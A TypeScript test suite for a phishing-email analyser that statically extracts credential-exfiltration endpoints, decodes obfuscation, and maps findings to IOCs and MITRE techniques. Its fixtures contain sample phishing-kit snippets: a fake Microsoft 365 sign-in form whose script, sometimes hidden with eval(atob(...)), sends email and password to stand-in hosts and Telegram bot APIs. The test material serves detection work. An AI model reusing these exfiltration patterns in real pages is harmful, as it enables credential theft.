import { describe, expect, it } from "vitest";
import { analyze } from "@/server/detection";
import { ctx } from "@/server/detection/__tests__/fixtures";
import { parseEmail } from "../channels/email/email-parser";
import { classify } from "../detection/classifier";
import { decodeLayers, exfilFindings, extractExfil, isScriptableAttachment } from "../intelligence/exfil-extractor";
import { extractIocs } from "../intelligence/ioc-extractor";
import { mapTechniques } from "../intelligence/mitre-mapper";
import { finalRisk } from "../scoring";

// Synthetic secrets in the real formats (not live credentials).
const BOT_ID = "7712345678";
const BOT_SECRET = `AA${"abcDEF123_-".repeat(3)}`;
const TOKEN = `${BOT_ID}:${BOT_SECRET}`;
const DISCORD_SECRET = "wQ3_".repeat(17);

const kit = (inner: string) => `<!doctype html><html><body>
  <h2>Microsoft 365</h2><form id="f"><input name="email"><input type="password" name="pass"><button>Sign in</button></form>
  <script>${inner}</script></body></html>`;

const run = (html: string) => extractExfil(html, { source: "attachment", origin: "Fatura.html", mode: "full" });

describe("exfiltration endpoints (static, no execution)", () => {
  it("finds a Telegram bot and its chat, without keeping the token", () => {
    const { endpoints } = run(kit(`var t="${TOKEN}"; var chat_id = "-1001234567890";
      fetch("https://api.telegram.org/bot" + t + "/sendMessage?chat_id=" + chat_id);
      fetch("https://api.telegram.org/bot${TOKEN}/sendMessage", {method:"POST"});`));
    const tg = endpoints.find((e) => e.kind === "telegram_bot")!;
    expect(tg.key).toBe(`telegram:bot:${BOT_ID}`);
    expect(tg.chatId).toBe("-1001234567890");
    expect(tg.secretHash).toMatch(/^[a-f0-9]{64}$/);
    expect(tg.origin).toBe("Fatura.html");
    expect(endpoints.filter((e) => e.kind === "telegram_bot")).toHaveLength(1);
    expect(JSON.stringify(endpoints)).not.toContain(BOT_SECRET);
  });

  it("resolves the chat id through a variable (regression: var cid = …; chat_id: cid)", () => {
    const hidden = Buffer.from(`fetch("https://api.telegram.org/bot${TOKEN}/sendMessage",{body:JSON.stringify({chat_id:cid})})`).toString("base64");
    const { endpoints } = run(kit(`var cid="-1001122334455"; eval(atob("${hidden}"));`));
    expect(endpoints.find((e) => e.kind === "telegram_bot")).toMatchObject({ chatId: "-1001122334455", via: "base64" });
  });

  it("decodes base64 / atob, fromCharCode and \\x escapes", () => {
    const hiddenTg = Buffer.from(`fetch("https://api.telegram.org/bot${TOKEN}/sendMessage")`).toString("base64");
    const url = "https://collect-pass.test/gate.php";
    const charCodes = [...`$.post("${url}")`].map((c) => c.charCodeAt(0)).join(",");
    const hex = [...`fetch("https://exfil-two.test/api")`].map((c) => `\\x${c.charCodeAt(0).toString(16).padStart(2, "0")}`).join("");
    const { endpoints } = run(kit(`eval(atob("${hiddenTg}")); eval(String.fromCharCode(${charCodes})); eval("${hex}");`));
    const byKind = Object.fromEntries(endpoints.map((e) => [e.kind, e]));
    expect(byKind.telegram_bot.via).toBe("base64");
    expect(byKind.php_handler).toMatchObject({ host: "collect-pass.test", via: "charcode", method: "POST", display: "hxxps://collect-pass[.]test/gate.php" });
    expect(endpoints.find((e) => e.host === "exfil-two.test")).toMatchObject({ kind: "js_endpoint", via: "escape" });
    expect(exfilFindings(endpoints, false).map((f) => f.code)).toEqual(expect.arrayContaining(["exfil_telegram", "exfil_php", "exfil_endpoint", "obfuscated_exfil"]));
  });

  it("recognises webhooks, Google Apps Script, form services, PHP forms and mailto", () => {
    const html = kit(`
      fetch("https://discord.com/api/webhooks/112233445566778899/${DISCORD_SECRET}", {method:"POST"});
      fetch("https://script.google.com/macros/s/AKfycbx${"Z9".repeat(12)}/exec");
      $.ajax({ url: "https://formspree.io/f/xyzabcde", type: "POST" });
      fetch("https://ipapi.co/json/");`) +
      `<form action="https://login-check.example/next.php" method="post"></form><form action="mailto:drop@attacker.test"></form>`;
    const { endpoints, ipLookup } = run(html);
    const kinds = endpoints.map((e) => e.kind).sort();
    expect(kinds).toEqual(["discord_webhook", "form_service", "google_apps_script", "mailto", "php_handler"]);
    expect(endpoints.find((e) => e.kind === "discord_webhook")!.display).not.toContain(DISCORD_SECRET);
    expect(endpoints.find((e) => e.kind === "mailto")!.key).toBe("mailto:drop@attacker.test");
    expect(ipLookup).toBe(true);
    // Shared services never become host indicators; the PHP host does.
    expect(endpoints.filter((e) => e.host).map((e) => e.host)).toEqual(["login-check.example"]);
  });

  it("no false positives on an ordinary newsletter", () => {
    const html = `<html><head><link href="https://fonts.googleapis.com/css2?family=Inter" rel="stylesheet">
      <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script></head><body>
      <form action="#"><input name="q"></form><form action="/search"></form>
      <a href="https://banka.al.example/oferta">Oferta</a><script>$.get("https://cdn.jsdelivr.net/x.json")</script></body></html>`;
    expect(run(html).endpoints).toEqual([]);
  });

  it("plain-text mode only reports tokens and webhooks, never ordinary links", () => {
    const text = `Paguani ne https://posta-al.test/pay.php sot. Debug: https://api.telegram.org/bot${TOKEN}/getMe`;
    const { endpoints } = extractExfil(text, { source: "text", mode: "tokens" });
    expect(endpoints.map((e) => e.kind)).toEqual(["telegram_bot"]);
  });

  it("only reads attachments that can carry code", () => {
    expect(isScriptableAttachment("Fatura.html", "application/octet-stream", "")).toBe(true);
    expect(isScriptableAttachment("scan.svg", "image/svg+xml", "")).toBe(true);
    expect(isScriptableAttachment("doc.bin", "application/octet-stream", "<!DOCTYPE html><html>")).toBe(true);
    expect(isScriptableAttachment("photo.jpg", "image/jpeg", "\xff\xd8\xff")).toBe(false);
    expect(decodeLayers("plain").length).toBe(1);
  });
});

describe("exfiltration in the full pipeline (EML with an HTML attachment)", () => {
  const attachment = kit(`var chat_id="-100987654321"; eval(atob("${Buffer.from(`fetch("https://api.telegram.org/bot${TOKEN}/sendMessage")`).toString("base64")}"));
    $.post("https://m365-verify.test/owa/next.php", {u: email, p: pass});`);
  const eml = [
    "From: IT Support <it@helpdesk-m365.test>",
    "Subject: Fjalekalimi juaj skadon sot",
    "MIME-Version: 1.0",
    'Content-Type: multipart/mixed; boundary="X"',
    "",
    "--X",
    "Content-Type: text/plain; charset=utf-8",
    "",
    "Fjalekalimi juaj skadon sot. Hapni bashkengjitjen dhe hyni per ta ruajtur.",
    "--X",
    'Content-Type: text/html; name="Fjalekalimi.html"',
    'Content-Disposition: attachment; filename="Fjalekalimi.html"',
    "Content-Transfer-Encoding: base64",
    "",
    Buffer.from(attachment).toString("base64"),
    "--X--",
    "",
  ].join("\r\n");

  it("extracts endpoints, IOCs, findings, MITRE and a hard risk floor", async () => {
    const msg = await parseEmail({ raw: eml, urls: [], attachments: [] }, "eml", "sq");
    expect(msg.exfil.map((e) => e.kind).sort()).toEqual(["php_handler", "telegram_bot"]);
    expect(msg.exfil.find((e) => e.kind === "telegram_bot")).toMatchObject({ source: "attachment", origin: "Fjalekalimi.html", chatId: "-100987654321", via: "base64" });
    expect(msg.headerFindings.map((f) => f.code)).toEqual(expect.arrayContaining(["exfil_telegram", "exfil_php", "obfuscated_exfil", "html_attachment"]));

    const iocs = extractIocs(msg);
    const exfilIocs = iocs.filter((i) => i.type === "exfil_endpoint");
    expect(exfilIocs.map((i) => i.subtype).sort()).toEqual(["php_handler", "telegram_bot"]);
    expect(exfilIocs.find((i) => i.subtype === "telegram_bot")!.detail).toMatchObject({ chatId: "-100987654321", origin: "Fjalekalimi.html" });
    expect(iocs.find((i) => i.type === "domain" && i.normalized === "m365-verify.test")).toBeTruthy();
    expect(iocs.find((i) => i.type === "url" && i.normalized === "https://m365-verify.test/owa/next.php")).toBeTruthy();
    expect(iocs.some((i) => i.normalized.includes("telegram.org"))).toBe(false);
    expect(JSON.stringify({ msg, iocs })).not.toContain(BOT_SECRET);

    const engine = await analyze({ kind: "email_signals", channel: "email", locale: "sq", text: msg.text, subject: msg.subject, sender: msg.sender }, ctx(), { model: null });
    const cls = classify({ msg, engine, findings: msg.headerFindings, reputations: [], urls: [] });
    expect(cls.find((c) => c.value === "credential_phishing")?.evidence.join(" ")).toMatch(/telegram bot/);
    expect(finalRisk(20, engine, [], msg.headerFindings)).toBeGreaterThanOrEqual(80);

    const ids = mapTechniques({ msg, classifications: cls, findings: msg.headerFindings, reasonCodes: [], urlCount: 0, verdictIsBenign: false }).map((t) => t.id);
    expect(ids).toEqual(expect.arrayContaining(["T1567", "T1056.003", "T1027"]));
  });
});
